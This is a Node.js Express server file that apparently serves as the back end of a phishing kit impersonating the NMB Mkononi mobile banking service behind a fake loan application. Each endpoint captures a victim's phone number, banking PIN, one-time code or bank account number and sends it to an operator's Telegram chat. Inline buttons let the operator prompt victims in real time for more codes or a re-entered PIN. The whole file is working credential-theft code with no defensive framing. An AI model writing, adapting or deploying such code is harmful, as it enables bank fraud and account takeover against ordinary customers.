const express = require('express');
const path = require('path');
const app = express();

const PORT = process.env.PORT || 10000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// In-memory session store: { sessionId: { phone, pin, otp, accountNumber, status } }
const sessions = {};

// Helper to send messages to Telegram with optional inline buttons
async function sendTelegramNotification(text, replyMarkup = null) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error('Telegram Bot Token or Chat ID is missing in environment variables.');
        return;
    }

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'HTML'
    };

    if (replyMarkup) {
        payload.reply_markup = replyMarkup;
    }

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const data = await response.json();
        return data;
    } catch (err) {
        console.error('Error sending Telegram message:', err);
    }
}

// 1. Submit Application / Phone
app.post('/api/submit-application', async (req, res) => {
    const { sessionId, phone } = req.body;
    sessions[sessionId] = { phone, status: 'pending' };

    await sendTelegramNotification(
        `<b>New Loan Application</b>\n\n` +
        `📱 Phone: <code>+255 ${phone}</code>\n` +
        `🆔 Session: ${sessionId}`
    );

    res.json({ success: true });
});

// 2. Submit PIN (Triggers when applicant taps INGIA)
app.post('/api/submit-pin', async (req, res) => {
    const { sessionId, pin } = req.body;
    if (!sessions[sessionId]) {
        sessions[sessionId] = {};
    }
    sessions[sessionId].pin = pin;
    sessions[sessionId].status = 'waiting_admin';

    const phone = sessions[sessionId].phone || 'Unknown';

    // Send to Telegram with Admin Control Buttons
    const inlineKeyboard = {
        inline_keyboard: [
            [
                { text: '✅ Approve / Success', callback_data: `success_${sessionId}` },
                { text: '💬 Request OTP', callback_data: `otp_${sessionId}` }
            ],
            [
                { text: '❌ Wrong PIN', callback_data: `badpin_${sessionId}` },
                { text: '🏦 Ask Account No', callback_data: `acc_${sessionId}` }
            ]
        ]
    };

    await sendTelegramNotification(
        `🚨 <b>NEW PIN SUBMITTED</b>\n\n` +
        `📱 Phone: <code>+255 ${phone}</code>\n` +
        `🔑 PIN: <b>${pin}</b>\n` +
        `🆔 Session: ${sessionId}`,
        inlineKeyboard
    );

    res.json({ success: true });
});

// 3. Submit OTP
app.post('/api/submit-otp', async (req, res) => {
    const { sessionId, otp } = req.body;
    if (sessions[sessionId]) {
        sessions[sessionId].otp = otp;
    }

    await sendTelegramNotification(
        `<b>OTP Submitted</b>\n\n` +
        `🔢 OTP: <b>${otp}</b>\n` +
        `🆔 Session: ${sessionId}`
    );

    res.json({ success: true });
});

// 4. Submit Bank Account
app.post('/api/submit-account', async (req, res) => {
    const { sessionId, accountNumber } = req.body;
    if (sessions[sessionId]) {
        sessions[sessionId].accountNumber = accountNumber;
    }

    await sendTelegramNotification(
        `<b>Bank Account Submitted</b>\n\n` +
        `🏦 Account: <code>${accountNumber}</code>\n` +
        `🆔 Session: ${sessionId}`
    );

    res.json({ success: true });
});

// 5. Check Status (Frontend polling endpoint)
app.get('/api/check-status/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = sessions[sessionId];
    if (!session) {
        return res.json({ status: 'pending' });
    }
    res.json({ status: session.status });
});

// 6. Telegram Webhook (Handles admin button clicks from Telegram)
app.post('/api/telegram-webhook', async (req, res) => {
    const update = req.body;
    if (update.callback_query) {
        const callbackQuery = update.callback_query;
        const data = callbackQuery.data; // e.g., "success_sess_abc123"
        const [action, sessionId] = data.split('_');

        if (sessions[sessionId]) {
            if (action === 'success') {
                sessions[sessionId].status = 'success';
            } else if (action === 'otp') {
                sessions[sessionId].status = 'next_step';
            } else if (action === 'badpin') {
                sessions[sessionId].status = 'restart_pin';
            } else if (action === 'acc') {
                sessions[sessionId].status = 'restart_acc';
            }
        }

        // Answer callback query to stop loading spinner on Telegram button
        const answerUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
        await fetch(answerUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: callbackQuery.id, text: `Action recorded: ${action}` })
        });
    }
    res.sendStatus(200);
});

app.listen(PORT, async () => {
    console.log(`NMB Mkononi Server running on port ${PORT}`);
    
    // Automatically set webhook if token is available and hosted on Render
    if (TELEGRAM_BOT_TOKEN) {
        const domain = process.env.RENDER_EXTERNAL_URL || `https://${process.env.RENDER_SERVICE_NAME}.onrender.com`;
        const webhookUrl = `${domain}/api/telegram-webhook`;
        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`);
            console.log(`Telegram webhook set to: ${webhookUrl}`);
        } catch (e) {
            console.error('Failed to auto-register Telegram webhook');
        }
    }
});
        
